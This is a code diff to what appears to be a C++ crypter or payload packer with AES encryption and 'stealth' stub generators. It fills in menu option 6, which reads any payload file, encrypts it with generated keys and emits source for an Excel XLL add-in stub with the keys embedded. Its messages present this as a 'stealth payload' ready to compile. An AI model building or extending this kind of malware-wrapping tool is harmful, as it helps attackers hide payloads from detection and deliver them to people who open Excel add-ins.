@@ -1,6 +1,7 @@
 #include "encryptor.h"
 #include "stealth_triple_encryptor.h"
 #include "encryptor_stub_generator.h"
+#include "xll_stub_generator.h"
 
 // AES S-box
 const uint8_t sbox[256] = {
@@ -603,8 +604,34 @@ int main() {
         }
         else if (choice == "6") {
             // Generate XLL Stealth Payload Stub
-            std::cout << "XLL stub generation coming soon..." << std::endl;
-            // TODO: Implement XLL stub generation
+            std::string inputFile = getInputFile();
+            std::string outputFile = getOutputFile();
+            
+            std::ifstream in(inputFile, std::ios::binary);
+            if (!in) {
+                std::cout << "Failed to open payload file: " << inputFile << std::endl;
+                continue;
+            }
+            
+            in.seekg(0, std::ios::end);
+            size_t size = in.tellg();
+            in.seekg(0, std::ios::beg);
+            
+            std::vector<uint8_t> payload(size);
+            in.read(reinterpret_cast<char*>(payload.data()), size);
+            in.close();
+            
+            XLLStubGenerator generator;
+            auto keys = generator.generateKeys();
+            std::string stub = generator.generateXLLStub(payload, keys);
+            
+            std::ofstream out(outputFile);
+            out << stub;
+            out.close();
+            
+            std::cout << "XLL stealth stub generated: " << outputFile << std::endl;
+            std::cout << "This stub can be compiled as an XLL add-in for Excel" << std::endl;
+            std::cout << "Keys stored as decimal numbers in code" << std::endl;
         }
         else {
             std::cout << "Invalid choice. Please try again." << std::endl;
